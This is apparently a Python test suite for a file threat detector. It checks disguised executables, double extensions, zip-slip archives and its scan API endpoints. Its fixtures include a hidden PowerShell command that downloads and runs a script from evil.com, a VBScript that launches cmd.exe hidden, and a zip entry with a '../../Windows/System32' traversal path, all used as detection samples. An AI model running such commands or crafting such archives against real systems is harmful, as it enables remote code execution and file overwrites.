"""Unit and integration tests for CyberShield File Threat Detection module."""

from __future__ import annotations

import io
import zipfile
import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.services.file_detector import FileThreatDetector

client = TestClient(app)


def _create_zip_with_members(members: list[tuple[str, bytes]]) -> bytes:
    """Helper to create an in-memory ZIP archive with specific member names and bytes."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in members:
            zf.writestr(name, data)
    return buf.getvalue()


class TestFileDetectorUnit:
    """Unit tests for FileThreatDetector heuristics and magic byte analysis."""

    def setup_method(self):
        self.detector = FileThreatDetector()

    def test_safe_png_image(self):
        """Valid PNG file with matching magic bytes should be classified as Safe."""
        png_bytes = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01"
        result = self.detector.analyze_bytes(png_bytes, filename="screenshot.png")
        assert result.risk_score < 30
        assert result.classification == "Safe"
        assert result.detected_mime == "PNG Image"
        assert len(result.findings) == 0

    def test_disguised_pe_executable_as_pdf(self):
        """Windows PE binary disguised as .pdf must trigger Critical classification."""
        pe_bytes = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00This program cannot be run in DOS mode."
        result = self.detector.analyze_bytes(pe_bytes, filename="tax_invoice_2026.pdf")
        assert result.risk_score >= 80
        assert result.classification == "Critical"
        assert any("deceptive executable disguise" in cat.lower() for cat in result.threat_categories)
        assert any("pe executable" in ind.lower() for ind in result.detected_indicators)

    def test_double_extension_deception(self):
        """Double extension like .pdf.exe must trigger Critical tier."""
        exe_bytes = b"MZ\x90\x00\x03\x00fake_binary_payload"
        result = self.detector.analyze_bytes(exe_bytes, filename="payroll_report.pdf.exe")
        assert result.risk_score >= 80
        assert result.classification == "Critical"
        assert any("double extension" in cat.lower() for cat in result.threat_categories)

    def test_dangerous_powershell_script(self):
        """PowerShell script with hidden execution and downloadstring must be flagged."""
        ps1_code = (
            "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass "
            "(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1') | IEX"
        ).encode("utf-8")
        result = self.detector.analyze_bytes(ps1_code, filename="setup.ps1")
        assert result.risk_score >= 60
        assert result.classification in ["High Risk", "Critical"]
        assert any("hidden window" in ind.lower() for ind in result.detected_indicators)
        assert any("download" in ind.lower() for ind in result.detected_indicators)

    def test_safe_zip_archive(self):
        """Clean ZIP archive with text documents should be Safe."""
        zip_bytes = _create_zip_with_members([
            ("readme.txt", b"Hello World"),
            ("notes.md", b"# Release Notes"),
        ])
        result = self.detector.analyze_bytes(zip_bytes, filename="documents.zip")
        assert result.is_archive is True
        assert result.risk_score < 30
        assert result.classification == "Safe"
        assert len(result.archive_contents) == 2

    def test_zip_slip_path_traversal(self):
        """ZIP archive with directory traversal sequences must trigger Critical tier."""
        zip_bytes = _create_zip_with_members([
            ("../../Windows/System32/malicious.dll", b"MZ_fake_payload"),
        ])
        result = self.detector.analyze_bytes(zip_bytes, filename="update_package.zip")
        assert result.risk_score >= 80
        assert result.classification == "Critical"
        assert any("zip slip" in cat.lower() for cat in result.threat_categories)

    def test_hidden_executable_in_zip(self):
        """ZIP containing hidden executable files must be flagged."""
        zip_bytes = _create_zip_with_members([
            ("innocent_folder/installer.exe", b"MZ_fake_payload"),
            ("readme.txt", b"Open installer"),
        ])
        result = self.detector.analyze_bytes(zip_bytes, filename="photos.zip")
        assert result.risk_score >= 30
        assert any("embedded executable" in cat.lower() for cat in result.threat_categories)

    def test_reject_empty_file(self):
        """Empty file bytes must raise ValueError."""
        with pytest.raises(ValueError, match="empty"):
            self.detector.analyze_bytes(b"", filename="empty.txt")

    def test_reject_oversized_file(self):
        """File exceeding max size limit must raise ValueError."""
        # Test size check by checking threshold constant
        assert FileThreatDetector.MAX_FILE_SIZE == 26_214_400


class TestFileDetectorEndpoints:
    """Integration tests for POST /api/v1/file/scan and alias."""

    def test_scan_file_endpoint_safe_txt(self):
        """POST /api/v1/file/scan with harmless text file returns 200."""
        files = {"file": ("notes.txt", b"Project meeting notes and todo list", "text/plain")}
        resp = client.post("/api/v1/file/scan", files=files)
        assert resp.status_code == 200
        data = resp.json()
        assert data["status"] == "inspected"
        assert data["scan_type"] == "file"
        assert data["filename"] == "notes.txt"
        assert data["classification"] == "Safe"
        assert data["risk_score"] < 30

    def test_scan_file_alias_endpoint(self):
        """POST /api/v1/scan/file alias returns identical structured response."""
        vbs_code = b'Set shell = CreateObject("WScript.Shell")\nshell.Run "cmd.exe /c start calc.exe", 0'
        files = {"file": ("script.vbs", vbs_code, "text/vbscript")}
        resp = client.post("/api/v1/scan/file", files=files)
        assert resp.status_code == 200
        data = resp.json()
        assert data["scan_type"] == "file"
        assert data["risk_score"] >= 30
        assert len(data["findings"]) > 0

    def test_scan_file_rejects_empty_upload(self):
        """Uploading a 0-byte file must return 400 Bad Request."""
        files = {"file": ("empty.dat", b"", "application/octet-stream")}
        resp = client.post("/api/v1/file/scan", files=files)
        assert resp.status_code == 400
        assert "empty" in resp.json()["detail"].lower()

